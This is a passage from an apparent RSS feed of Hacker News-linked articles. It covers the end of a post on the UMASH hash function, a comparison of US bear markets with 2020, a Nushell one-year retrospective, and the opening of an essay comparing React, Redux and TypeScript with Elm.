<a href="https://github.com/google/farmhash">farmhash32</a>
(19 GB/s). In fact, even the 128-bit fingerprint (11.2 GB/s) is
comparable to respectable options like
<a href="https://github.com/aappleby/smhasher/blob/master/src/MurmurHash2.cpp#L89">MurmurHash64A</a>
(5.8 GB/s) and
<a href="https://burtleburtle.net/bob/hash/spooky.html">SpookyHash</a> (11.6 GB/s).</p><p>What sets UMASH apart from these other non-cryptographic hash
functions is its proof of a collision probability bound. In the
absence of an adversary that adaptively constructs pathological inputs
as it infers more information about the randomly chosen parameters, we
know that two distinct inputs of \(s\) or fewer bytes will have the
same 64-bit hash with probability at most \(\lceil s / 2048 \rceil
\cdot 2^{-56},\) where the expectation is taken over the random
“key” parameters.</p><p>Only one non-cryptographic hash function in
<a href="https://github.com/rurban/smhasher">Reini Urban’s fork of SMHasher</a>
provides this sort of bound: <a href="https://github.com/lemire/clhash">CLHash</a>
<a href="https://arxiv.org/abs/1503.03465">guarantees a collision probability \(\approx 2^{-63}\)</a>
in the same
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">universal hashing</a>
model as UMASH. While CLHash’s peak throughput (22 GB/s) is
equal to UMASH’s, its latency on short inputs is worse (23-25 ns
instead of 9-22ns). We will also see that its stronger collision
bound remains too weak for many practical applications. In order to
compute a <a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint</a>
with CLHash, one would have to combine multiple hashes, exactly like
we did for the 128-bit UMASH fingerprint.</p><p>Actual cryptographic hash functions provide stronger bounds in a much
more pessimistic model; however they’re also markedly slower than
non-cryptographic hashes. <a href="https://github.com/BLAKE3-team/BLAKE3">BLAKE3</a>
needs at least 66 ns to hash short inputs, and achieves a peak throughput
of 5.5 GB/s. Even the <a href="https://github.com/rust-lang/rust/issues/29754">reduced-round SipHash-1-3</a>
hashes short inputs in 18-40 ns and longer ones at a peak throughput
of 2.8 GB/s. That’s the price of their pessimistically adversarial
security model. Depending on the application, it can make sense to
consider a more restricted adversary that must prepare its dirty deed
before the hash function’s parameters are generated at random, and
still ask for provable bounds on the probability of collisions.
That’s the niche we’re targeting with UMASH.</p><p>Clearly, the industry is comfortable with no bound at all.
However, even in the absence of
<a href="https://www.131002.net/siphash/#at">seed-independent collisions</a>,
timing side-channels in a data structure implementation could
theoretically leak information about colliding inputs, and iterating
over a hash table’s entries to print its contents can divulge even more
bits. A sufficiently motivated adversary could use something like
that to learn more about the key and deploy an algorithmic denial of
service attack. For example, the linear structure of UMASH (and of
other polynomial hashes like CLHash) makes it easy to combine known
collisions to create exponentially more colliding inputs. There is no
universal answer; UMASH is simply another point in the solution space.</p><p>If reasonable performance coupled with an actual bound on collision
probability <em>for data that does not adaptively break the hash</em> sounds
useful to you,
<a href="https://github.com/backtrace-labs/umash">take a look at UMASH on GitHub</a>!</p><p>The <a href="#but-why">next section</a> will explain why we found it useful to
design another hash function. The rest of the post
<a href="#umash-high-level">sketches how UMASH works</a> and
<a href="#implementation-tricks">how it balances short-input latency and strength</a>,
before <a href="#usage">describing a few interesting usage patterns.</a></p><p><small>The latency and throughput results above were all measured on
the same unloaded 2.5 GHz Xeon 8175M. While we did not disable
frequency scaling (#cloud), the clock rate seemed stable at 3.1
GHz during our run.</small></p><h2 id="a-idbut-whyahow-did-we-even-get-here"><a id="but-why"></a>How did we even get here?</h2><p>Engineering is the discipline of satisficisation: crisply defined
problems with perfect solutions rarely exist in reality, so we must
resign ourselves to satisfying approximate constraint sets “well
enough.” However, there are times when all options are not only
imperfect, but downright sucky. That’s when one has to put on a
different hat, and question the problem itself: are our constraints
irremediably at odds, or are we looking at an under-explored
solution space?</p><p>In the former case, we simply have to want something else. In the
latter, it might make sense to spend time to really understand the
current set of options and hand-roll a specialised approach.</p><p>That’s the choice we faced when we started caching intermediate
results in
<a href="https://help.backtrace.io/en/articles/2428859-web-console-overview">Backtrace’s database</a>
and found a dearth of acceptable hash functions. Our in-memory
columnar database is a core component of the backend, and, like most
analytics databases, it tends to process streams of similar queries.
However, a naïve query cache would be ineffective: our more heavily
loaded servers handle a constant write load of more than 100 events
per second with dozens of indexed attributes (populated column values)
each. Moreover, queries invariably select a large number of data
points with a time windowing predicate that excludes old data… and
the endpoints of these time windows advance with each wall-clock
second. The queries evolve over time, and must usually consider newly
ingested data points.</p><p><a href="https://www.gsd.inesc-id.pt/~rodrigo/slider_middleware14.pdf">Bhatotia et al’s Slider</a>
show how we can specialise the idea of
<a href="http://adapton.org/">self-adjusting or incremental computation</a>
for repeated MapReduce-style queries over a sliding window.
The key idea is to split the data set at stable boundaries (e.g., on
date change boundaries rather than 24 hours from the beginning of the
current time window) in order to expose memoisation opportunities, and
to do so recursively to repair around point mutations to older data.</p><p>Caching fully aggregated partial results works well for static
queries, like scheduled reports… but the first step towards creating
a great report is interactive data exploration, and that’s an activity
we strive to support well, even when drilling down tens of millions of
rich data points. That’s why we want to also cache intermediate
results, in order to improve response times when tweaking a saved
report, or when crafting ad hoc queries to better understand how and
when an application fails.</p><p>We must go back to a
<a href="http://www.umut-acar.org/self-adjusting-computation">more general incremental computation strategy</a>:
rather than only splitting up inputs, we want to stably partition the
data dependency graph of each query, in order to identify shared
subcomponents whose results can be reused. This finer grained
strategy surfaces opportunities to “resynchronise” computations, to
recognize when different expressions end up generating a subset of
identical results, enabling reuse in later steps. For example, when
someone updates a query by adding a selection predicate that only
rejects a small fraction of the data, we can expect to reuse some of
the post-selection work executed for earlier incarnations of the
query, if we remember to key on the selected data points rather than
the predicates.</p><p>The complication here is that these intermediate results tend to be
large. Useful analytical queries start small (a reasonable query
coupled with cache/transaction invalidation metadata to stand in for
the full data set), grow larger as we select data points, arrange them
in groups, and materialise their attributes, and shrink again at the
end, as we summarise data and throw out less interesting groups.</p><p>When caching the latter shrinking steps, where resynchronised reuse
opportunities abound and can save a lot of CPU time, we often
find that storing a fully materialised representation of the cache key
would take up more space than the cached result.</p><p>A classic approach in this situation is to fingerprint cache keys with
a cryptographic hash function like
<a href="https://en.wikipedia.org/wiki/BLAKE_(hash_function)">BLAKE</a>
or <a href="https://en.wikipedia.org/wiki/SHA-3">SHA-3</a>, and store a
compact (128 or 256 bits) fingerprint instead of the cache key: the
probability of a collision is then so low that we might as well assume
any false positive will have been caused by a bug in the code or a
hardware failure. For example,
<a href="https://users.ece.cmu.edu/~omutlu/pub/memory-errors-at-facebook_dsn15.pdf#page=3">a study of memory errors at Facebook</a>
found that uncorrectable memory errors affect 0.03% of servers each
month. Assuming a generous clock rate of 5 GHz, this means each
clock cycle may be afflicted by such a memory error with probability
\(\approx 2.2\cdot 10^{-20} &gt; 2^{-66}.\) If we can guarantee that
distinct inputs collide with probability significantly less than
\(2^{-66}\), e.g., \(&lt; 2^{-70},\) any collision is far
more likely to have been caused by a bug in our code or by
hardware failure than by the fingerprinting algorithm itself.</p><p>Using cryptographic hashes is certainly safe enough, but requires a lot of
CPU time, and, more importantly, worsens latency on smaller keys (for
which caching may not be that …</p></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://engineering.backtrace.io/2020-08-24-umash-fast-enough-almost-universal-fingerprinting/">https://engineering.backtrace.io/2020-08-24-umash-fast-enough-almost-universal-fingerprinting/</a></em></p>]]>
            </description>
            <link>https://engineering.backtrace.io/2020-08-24-umash-fast-enough-almost-universal-fingerprinting/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260020</guid>
            <pubDate>Mon, 24 Aug 2020 12:39:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Comparing the Last 10 Bear Markets with 2020]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24260012">thread link</a>) | @dollartrak
<br/>
August 24, 2020 | https://www.dollartrak.com/comparison-of-the-10-bear-markets-before-2020/ | <a href="https://web.archive.org/web/*/https://www.dollartrak.com/comparison-of-the-10-bear-markets-before-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
					<div>
			<div>
		
				<div id="primary">
		<main id="main" role="main">
			
<article id="post-1216">
	<div>
		<!--post thumbnal options-->
		 
			<div>
				<a href="https://www.dollartrak.com/comparison-of-the-10-bear-markets-before-2020/">
				 
            <p><img width="960" height="870" src="https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/bear-scaled-e1596223900804.jpg?fit=960%2C870&amp;ssl=1" data-src="https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/bear-scaled-e1596223900804.jpg?fit=960%2C870&amp;ssl=1" alt="bear" loading="lazy" data-srcset="https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/bear-scaled-e1596223900804.jpg?w=960&amp;ssl=1 960w, https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/bear-scaled-e1596223900804.jpg?resize=300%2C272&amp;ssl=1 300w, https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/bear-scaled-e1596223900804.jpg?resize=768%2C696&amp;ssl=1 768w" data-sizes="(max-width: 960px) 100vw, 960px">            </p><!-- .post-thumbnail -->

        				</a>
			</div><!-- .post-thumb-->
		
		<div>
			
			
			<!-- .entry-header -->

			<div>
				
<p>The US market indexes entered bear market territory in March of 2020. It has been a long time since the US has experienced a bear market, 13 years to be precise.  Since the best way to learn about the present is to look at the past, it is a good time for comparing the last 10 bear markets before 2020.</p>



<p>They range in time from 1956 to 2020 and lasted between 18 and 87 months before a total recovery was achieved.  By almost any measurement, the current 2020 bear market is the mildest on record so far.  Lets look at the last 10 bear markets.</p>



<h2>Bear Market Comparison Summary</h2>



<figure><table><thead><tr><th data-align="left">Beginning</th><th data-align="center">Months till Recovery</th><th data-align="center">Max Market Drop</th><th data-align="center">Months Till Bottom</th><th>Caused By</th></tr></thead><tbody><tr><td data-align="left">8-6-1956</td><td data-align="center">26</td><td data-align="center">-21.5%</td><td data-align="center">15</td><td><a href="https://en.wikipedia.org/wiki/Recession_of_1958" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">The “Eisenhower Recession”</a></td></tr><tr><td data-align="left">12-13-1961</td><td data-align="center">21</td><td data-align="center">-28%</td><td data-align="center">7</td><td><a href="https://en.wikipedia.org/wiki/Kennedy_Slide_of_1962" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">The “Kennedy Slide”</a></td></tr><tr><td data-align="left">02-10-1966</td><td data-align="center">18</td><td data-align="center">-22.2%</td><td data-align="center">8</td><td><a href="https://files.stlouisfed.org/files/htdocs/publications/review/69/09/Historical_Sep1969.pdf" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">Credit Crunch of 1966</a></td></tr><tr><td data-align="left">12-2-1968</td><td data-align="center">40</td><td data-align="center">-36.1%</td><td data-align="center">18</td><td><a href="https://en.wikipedia.org/wiki/Recession_of_1969%E2%80%931970" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">1969-’70 Recession</a></td></tr><tr><td data-align="left">01-12-1973</td><td data-align="center">70</td><td data-align="center">-48.2%</td><td data-align="center">21</td><td><a href="https://en.wikipedia.org/wiki/Stagflation" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">1973-’74 Recession resulting in stagflation</a></td></tr><tr><td data-align="left">11-21-1980</td><td data-align="center">24</td><td data-align="center">-27.1%</td><td data-align="center">21</td><td><a href="https://en.wikipedia.org/wiki/Early_1980s_recession" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">1981-’82 recession</a></td></tr><tr><td data-align="left">8-26-1987</td><td data-align="center">23</td><td data-align="center">-33.5%</td><td data-align="center"><strong>3</strong></td><td><a href="https://en.wikipedia.org/wiki/Black_Monday_(1987)" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">Black Monday</a></td></tr><tr><td data-align="left">3-27-2000</td><td data-align="center"><strong>87</strong></td><td data-align="center">-49.1%</td><td data-align="center">31</td><td><a href="https://en.wikipedia.org/wiki/Dot-com_bubble" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">Dot Com Crash</a>, 9/11</td></tr><tr><td data-align="left">10-10-2007</td><td data-align="center">66</td><td data-align="center"><strong>-56.8%</strong></td><td data-align="center">17</td><td><a href="https://en.wikipedia.org/wiki/Financial_crisis_of_2007%E2%80%932008" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">Housing Bubble</a></td></tr><tr><td data-align="left">02-20-2020</td><td data-align="center"></td><td data-align="center">-26.7%(so far)</td><td data-align="center"></td><td><a href="https://en.wikipedia.org/wiki/COVID-19_pandemic" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">COVID-19</a></td></tr><tr><td data-align="left"><em>AVERAGE</em></td><td data-align="center"><em>42</em></td><td data-align="center"><em>-35%</em></td><td data-align="center"><em>14</em></td><td><em>Generally caused by a recession</em></td></tr></tbody></table><figcaption>The last 10 bear markets</figcaption></figure>



<h2>Comparing The Bear Markets</h2>



<div><figure><img loading="lazy" width="340" height="255" src="https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/crash.jpg?resize=340%2C255&amp;ssl=1" data-src="https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/crash.jpg?resize=340%2C255&amp;ssl=1" alt="Stock Market Crash" title="stock market crash" data-srcset="https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/crash.jpg?w=340&amp;ssl=1 340w, https://i2.wp.com/www.dollartrak.com/wp-content/uploads/2020/07/crash.jpg?resize=300%2C225&amp;ssl=1 300w" data-sizes="(max-width: 340px) 100vw, 340px" data-recalc-dims="1"><figcaption>Comparing Market Crashes</figcaption></figure></div>



<p>Looking at the data quite a few things stand out.  The average bear market lasts 42 months overall, but sees 35% drop in the stock market over 14 months before it recovers.  Lets look a little closer.</p>



<h3>How Often Do Bear Markets Occur</h3>



<p>Between 1956 and 2020 there have been a total of 10 bear markets.  This is spread out over 64 years for an average of 6.4 years between markets.   Our last bear market was all the way back in 2007, or 13 years ago.   </p>



<p>By the laws of averages we were way overdue.  Previously, the last longest time between bear markets was also 13 years with the bear market starting in 2000.  Also note, the 2000  bear market saw the second largest drop on record of 49.1%!</p>



<h3>How Long Do Bear Markets Take to Bottom Out</h3>



<p>Bear markets bottomed out over an average of 14 months from the time they begun.  The fastest a market every bottomed out was in 1987 with 3 months. </p>



<p>If the current bear market has bottomed out, and don’t assume it has, it would win the fastest drop to the bottom at a rapid 2 months.</p>



<h3>How Much Do Stocks End Up Dropping</h3>



<p>On average a bear market sees a 35% decline from peak to trough.  The all time peak was 56.8% caused by the great financial crises created by the housing bubble of 2007.</p>



<p>By comparison, 2020’s current max drop of -26.7% from peak is pretty tame.    Don’t assume that stocks have found the bottom though, as of August 2020 this is still a very young bear market.</p>



<h3>How Long Do They Last</h3>



<p>Bear market last 42 months on average, with the shortest on record at 18 months.  This is bad news for those that believe the 2020 bear market is already over.  If this ends up being true, it would be by far the shortest bear market on record.  Let’s just hope we don’t end up at 87 months, which is the longest on record.</p>



<h2>Conclusion</h2>



<p>It is interesting to look back in time comparing the last 10 US stock bear markets.  It is impossible to say how bad the current bear market will get or how long it will last, but judging from the past bear markets it is likely not over yet.  </p>



<p>Considering the economic turmoil that we may still yet have in front of us, it is a good time to review your financial positions and make sure you are comfortable you can weather the storm.  Make sure your assets are diversified and that you are comfortable with your risk profile.  You should be very careful with any <a href="https://www.dollartrak.com/speculating-vs-investing/">speculative</a> holdings that risk total loss.</p>





			</div><!-- .entry-content -->
			
		</div>
	</div>
</article><!-- #post-## -->					
					

						</main><!-- #main -->
	</div><!-- #primary -->
<!-- #secondary -->

    		</div><!-- #row -->
		</div><!-- #container -->
	</div></div>]]>
            </description>
            <link>https://www.dollartrak.com/comparison-of-the-10-bear-markets-before-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24260012</guid>
            <pubDate>Mon, 24 Aug 2020 12:38:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[One Year of Nushell]]>
            </title>
            <description>
<![CDATA[
Score 210 | Comments 40 (<a href="https://news.ycombinator.com/item?id=24259914">thread link</a>) | @rainworld
<br/>
August 24, 2020 | https://www.nushell.sh/blog/2020/08/23/year_of_nushell.html | <a href="https://web.archive.org/web/*/https://www.nushell.sh/blog/2020/08/23/year_of_nushell.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <section>
      

      <p>Hard to imagine that it’s already been a year since Nu first went public. At the time, it was largely a demo of what could be possible, but still needed quite a bit of work to make it ready for everyday use. A year later and we’ve learned a lot, and made a few mistakes along the way. In this post, we look back over the year and see how we did and where we might be going in the future.</p>



<p>When Nu first started, it started with a simple idea: the output of <code>ls</code>, <code>ps</code>, and <code>sysinfo</code> should all output the same thing. Taking a page from PowerShell, we explored outputting structured data and quickly settled on a table design that would support the output of each of the three commands, with the added ability of streaming the output as it became available.</p>

<p>Around this idea, we then built a set of “filters”, like the <code>where</code> clause, borrowed from SQL, and a growing set of data types we would support natively.  Soon, we were able to write more complex statements like <code>ls | where size &gt; 10kb</code>. This became the crux of the idea - commands that output values from a core set of data types into a stream, composed together with the traditional UNIX pipe (<code>|</code>), so that you could build up a complex set of commands that work over the data as it streams through.</p>



<h2 id="contributors">Contributors</h2>

<p>Before we got started talking about Nushell today, we wanted to give a <em>big</em> “thank you!” to everyone who has contributed to Nu to get us to this point. Nu is what it is because of your help.</p>

<p>1ntEgr8, AaronC81, AdminXVII, aeosynth, aeshirey, aidanharris, almindor, Aloso, Amanita-muscaria, amousa11, andrasio, Andrew-Webb, arashout, arnaldo2792, avandesa, avranju, bailey-layzer, BatmanAoD, bndbsh, Bocom, boisgera, Borimino, BradyBromley, BurNiinTRee, Byron, candostdagdeviren, casidiablo, charlespierce, chhetripradeep, cjpearce, coolshaurya, cristicismas, DangerFunPants, daschl, daveremy, davidrobertmason, Delapouite, dependabot[bot], Detegr, devnought, Dimagog, djc, drmason13, DrSensor, elichai, eltonlaw, EmNudge, eoinkelly, equal-l2, est31, fdncred, filalex77, Flare576, gilesv, gorogoroumaru, GuillaumeGomez, hdhoang, he4d, hilias, HiranmayaGundu, hirschenberger, homburg, iamcodemaker, incrop, ineol, Jacobious52, jankoprowski, JCavallo, jdvr, jerodsanto, JesterOrNot, johnae, johnterickson, jonathandturner, JonnyWalker81, jonstodle, JosephTLyons, jzaefferer, k-brk, Kelli314, klnusbaum, kloun, kornelski, kubouch, kvrhdn, landaire, lesichkovm, LhKipp, lightclient, lincis, lord, luccasmmg, marcelocg, matsuu, mattclarke, mattyhall, max-sixty, mfarberbrodsky, mhmdanas, mike-morr, miller-time, mistydemeo, mlbright, mlh758, morrme, nalshihabi, naufraghi, nespera, neuronull, nickgerace, nmandery, notryanb, oknozor, orf, orientnab, oskarskog, oylenshpeegul, pag4k, Paradiesstaub, philip-peterson, piotrek-szczygiel, pizzafox, pka, pmeredit, pontaoski, Porges, pulpdrew, q-b, quebin31, rabisg0, ramonsnir, rimathia, ritobanrc, rnxpyke, romanlevin, routrohan, rrichardson, rtlechow, rutrum, ryuichi1208, Samboy218, samhedin, sandorex, sdfnz, sebastian-xyz, shaaraddalvi, shiena, siedentop, Sosthene-Guedon, Southclaws, svartalf, taiki-e, Tauheed-Elahee, tchak, thegedge, tim77, Tiwalun, twe4ked, twitu, u5surf, UltraWelfare, uma0317, utam0k, vsoch, vthriller, waldyrious, warrenseine, wycats, yaahc, yahsinhuangtw, yanganto, ymgyt, zombie110year</p>



<p>Nushell is an interactive programming language for working with your files, your system, and your data as a shell, a notebook, and more.</p>

<h2 id="nu-is-more-than-a-shell">Nu is more than a shell</h2>

<p>It’s easy to think of Nushell as just a shell. It’s even got ‘shell’ in the name. It’s the first and probably main way you’ll interact with it. So why say it’s “more than a shell”?</p>

<p>In truth, Nushell is actually two things at once: Nu and Nushell. Nu is an interactive language for processing streams of structured data, data that you’re probably getting from files, your system, a web address, etc.</p>

<p>So what’s Nushell?</p>

<p>Nushell is taking the Nu language and putting it into a shell, and building around it a set of shell features to make it feel comfortable to use as a login shell. Completions, pretty error messages, and the like.</p>

<p>When we say that “Nu is more than a shell”, does that imply that Nu can be used in other places, too? Absolutely. We’ve got two more hosts that let you run Nu, a <a href="https://github.com/nushell/nu_jupyter">jupyter-based</a> host that lets you run Nu in jupyter notebooks, and a <a href="https://github.com/nushell/demo">WebAssembly-based</a> host that we use to create the <a href="https://www.nushell.sh/demo/">Nu playground</a></p>

<p>The idea of Nu runs deeper than just the shell, to being a language that’s relatively easy to learn, yet powerful enough to do real work with your system, to process large amounts of data, to interactively let you iterate quickly on an idea, to invite exploration by building up a pipeline one piece at a time. There’s really no shortage of ambition for where we hope to go.</p>



<p>Nu’s original design has proven surprisingly robust thus far. Some of its core ideas are continuing to pay dividends a year later. Let’s look at the designs that still feel right.</p>

<h2 id="pipelines-are-infinite">Pipelines are infinite</h2>

<p>When we first started writing Nu, we took a few shortcuts that had us processing all the data in a pipeline at once. Very quickly, we realize this wasn’t going to work. External commands (think <code>cat /dev/random</code>) can output an infinite stream of data, and the system needs to be able to handle it. Understanding this, we transitioned to a different model: data flows between command as infinite streams of structured data. As the data is processed, we avoid collecting the data whenever possible to allow this streaming to happen.</p>

<p>Because the streams can be infinite, even the printing out of tables is done a batch at a time.</p>

<h2 id="separating-viewing-data-from-the-data-itself">Separating viewing data from the data itself</h2>

<p>Coming from other shells, the idea of running <code>echo</code> or <code>ls</code> goes hand-in-hand with printing something to the terminal. It’s difficult to see that there two steps going on behind the scenes: creating the information and then displaying it to the screen.</p>

<p>In Nu, these two steps are distinct. The <code>echo</code> command gets data ready to output into stream, but doesn’t do any work to print it to the screen. Likewise, <code>ls</code> gets ready to output a stream of file and directory entries, but doesn’t actually display this information.</p>

<p>That’s because both <code>echo</code> and <code>ls</code> are lazy commands. They’ll only do the work if the data is pulled from the stream. As a result, the step of viewing the data is separate from the step of creating it.</p>

<p>Behind the scenes, Nu converts a standalone <code>ls</code> to be the pipeline <code>ls | autoview</code>. The work of viewing comes from <code>autoview</code> and it handles working with the data and calling the proper viewer. In this way, we’re able to keep things as structured data for as long as possible, and only convert it to be displayed as the final step before being shown to the user. (note: the wasm-based demo and jupyter do a similar step, but instead of adding <code>autoview</code>, they add <code>to html</code>)</p>

<h2 id="rich-data-types">Rich data types</h2>

<p>In a similar way to working with structured data, rather than only plain text, Nu takes a different approach to data types as well. Nu takes the traditional set of basic types, like strings and numbers, and extends them into a richer set of basic data primitives.</p>

<p>Numbers are represented internally as big numbers and big decimals, rather than integers and floating point machine-based representations. This gives us more flexibility to do math more accurately, and generally removes the worry of whether the number you want to work with will fit in the integer or float size you have available.</p>

<p>We carry this further, by also representing values common in modern computer usage: URLs, file paths, file sizes, durations, and dates are all examples of built-in data types. By building them in, Nu can have better syntax and type checking with their use.</p>

<p>For example, in Nu it’s possible to write <code>= 1min + 1sec</code> to create a duration that is one minute one second long. You can also use the file sizes, like being able to filter a directory list by the size of the file <code>ls | where size &gt; 10kb</code>.</p>

<p>Nu also can help if you try to mix types that shouldn’t. For example, if you had written: <code>= 1min + 1kb</code> it seems you didn’t mean to add time and file sizes together, and Nu gives you an error if you do:</p>

<div><div><pre><code>error: Coercion error
  ┌─ shell:1:3
  │
1 │ = 1min + 1kb
  │   ^^^^   --- filesize(in bytes)
  │   │       
  │   duration
</code></pre></div></div>

<p><em>note: we’ll be making this error better in the future</em></p>

<p>Data in Nu also isn’t just the value, but it’s also a set of metadata that comes with the value. For example, if you load data from a file using the <code>open</code> command, we track the place that it’s loaded along with the data that’s loaded. We can see this metadata using the <code>tags</code> command:</p>

<div><div><pre><code>open package.json | tags
───┬─────────────────┬──────────────────────────────────────────────────────────────────────────────
 # │      span       │                                    anchor                                    
───┼─────────────────┼──────────────────────────────────────────────────────────────────────────────
 0 │ [row end start] │ /home/jonathan/Source/servo/tests/wpt/web-platform-tests/webrtc/tools/packag 
   │                 │ e.json                                                                       
───┴─────────────────┴──────────────────────────────────────────────────────────────────────────────
</code></pre></div></div>

<p>This extra information allows us to know how to view the contents, and even save you time when you use the <code>save</code> command, as it will use the original location by default.</p>

<h2 id="keeping-it-fun">Keeping it fun</h2>

<p>Something we attached to early on was the idea that Nu should be fun. It should be fun to work on, it should be fun to contribute to, and it should be fun to use.</p>

<p>Nu is really about play. You play with your data, you play with the structures that make up your files and filesystem, you play with what web services give back to you. Everything about Nu is made to invite you to explore how things work and how data is put together. As you play, you learn more about Nu works and how to better use it. We firmly believe …</p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.nushell.sh/blog/2020/08/23/year_of_nushell.html">https://www.nushell.sh/blog/2020/08/23/year_of_nushell.html</a></em></p>]]>
            </description>
            <link>https://www.nushell.sh/blog/2020/08/23/year_of_nushell.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24259914</guid>
            <pubDate>Mon, 24 Aug 2020 12:25:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If you're using React, Redux and TypeScript, you would be so happy with Elm]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24259811">thread link</a>) | @antouank
<br/>
August 24, 2020 | https://ohanhi.com/react-typescript-vs-elm.html | <a href="https://web.archive.org/web/*/https://ohanhi.com/react-typescript-vs-elm.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <a href="https://ohanhi.com/">« Home</a>

    
<div>
  <p><img src="https://ohanhi.com/img/profile_tiny.jpg" alt=""></p>
  <p>March 1, 2019</p>
</div>

<hr>

<h3>Read this to</h3>
<ul>
  
  <li>see how React, Redux and TypeScript is already quite close to using Elm</li>
  
  <li>get to know some things where Elm could help you more than TypeScript</li>
  
</ul>

<h3>I expect you to know</h3>
<ul>
  
  <li>how it is to work with React and Redux, and some TypeScript</li>
  
</ul>

<hr> <h2 id="introduction">Introduction</h2>
<p>I have used Elm in two client projects spanning about three years total. In my latest project we used React, Redux and TypeScript instead, and that was pretty nice too. This post is meant to be a conversation starter, a thought piece, on “what if we tried Elm for real?” If you’re thinking no one is using Elm, let me point out that companies like <a href="https://github.com/Microsoft/elm-json-tree-view">Microsoft</a>, <a href="https://discourse.elm-lang.org/t/ibm-releases-elm-powered-app/2364">IBM</a> and <a href="https://learningmusic.ableton.com/">Ableton</a> have successfully used Elm in production.</p>
<p>If you’ve used TypeScript in a project already, good for you! You can probably agree that the static types it provides can be a real help when adding new features. And where it really shines is refactoring. Changing function arguments or removing fields from a configuration object in a JavaScript project can be a very risky thing, but the TypeScript compiler can spot many places where things are going wrong. You can be much more confident that the code will work. Now imagine that was the case for every single change in the code base? And you could be 100% certain there are no places left using the old structure once you’re done? That’s what Elm can give you! Furthermore, the compiler will help you go through all the steps needed while adding a feature, but let’s come back to that a bit later.</p>
<p>Before we begin, I want to emphasize that I am not saying Elm is the best solution in all cases. There are very valid reasons to use React, Redux and TypeScript instead! There are valid reasons even for not using a framework at all. This post just focuses on the lovely things I know from Elm, compared to how the same thing worked in the React project. Do what you love and what feels like the best solution for the problem at hand. 💝</p>
<h2 id="overview-of-similarities">Overview of similarities</h2>
<p>Let’s start with comparing the vocabulary. How do React, Redux and TypeScript features relate to Elm in the overall context of building a single page app? You might have heard that Redux is <a href="https://github.com/reduxjs/redux#influences">inspired by</a> the Elm architecture. This is very helpful, since it means we can draw some rather direct analogies between it and Elm. In React, components without any local state correspond to the way Elm views work. I won’t talk about too many TypeScript features since they are not the point of this post.</p>
<p>This table is a simplification for sure, but hopefully a helpful one.</p>
<table>
<thead>
<tr>
<th>Concern</th>
<th>React+Redux+TS</th>
<th>Elm</th>
</tr>
</thead>
<tbody>
<tr>
<td>views</td>
<td>stateless React components</td>
<td><code>view</code></td>
</tr>
<tr>
<td>data modeling</td>
<td>TypeScript types</td>
<td>types</td>
</tr>
<tr>
<td>app state</td>
<td>Redux store</td>
<td><code>model</code></td>
</tr>
<tr>
<td>input/events</td>
<td>Redux actions</td>
<td><code>Msg</code> (message)</td>
</tr>
<tr>
<td>updating state</td>
<td>Redux reducer</td>
<td><code>update</code></td>
</tr>
<tr>
<td>effects (e.g.&nbsp;HTTP request)</td>
<td><code>redux-loop</code>, <code>redux-saga</code>, …</td>
<td><code>Cmd</code> (command)</td>
</tr>
</tbody>
</table>
<p>All in all, the two “frameworks” provide comparable functionality and one can follow very similar coding patterns in both. The main differences are that in Elm you can only have one <code>model</code> and in Redux you could have several stores, and that there are no stateful views in Elm. Everything that changes the UI simply has to be in the <code>model</code>. These might sound like big restrictions, but in my experience they really cut down on the bikeshedding we all end up doing in bigger projects. You never have to argue whether a slice of state should have its own store or not, or if the input value should go in the Redux store or local state.</p>
<p>With that, let’s move on to covering some points that we knew were especially nice about Elm and we had some trouble with in our React, Redux and TypeScript project!</p>
<h2 id="everything-is-safe">Everything is safe</h2>
<p>“I call it my billion-dollar mistake” said <a href="https://en.wikipedia.org/wiki/Tony_Hoare">Sir Tony Hoare</a> at a conference in 2009. He was speaking about the null reference, something he came up with in 1965. “My goal was to ensure that all use of references should be absolutely safe, with checking performed automatically by the compiler.”</p>
<p>TypeScript is a superset of JavaScript, so it can never remedy the billion dollar mistake. Elm has done it. The way you deal with potentially non-existing values (like the first element in a list) is that you always have a fallback of some sort. This is incredibly reassuring. Even in a large codebase I have never seen before, I can be certain that changes I make will not cause runtime exceptions somewhere else. Also, no matter what kind of deadlines we’ve been under, there won’t be unexplored paths that lead to crashes. We have much more time to focus on the logic bugs instead!</p>
<p>If this idea seems unfamiliar, here’s a concrete example of how this works in Elm. Converting a string to a floating point number is a simple case where things might not work out:</p>
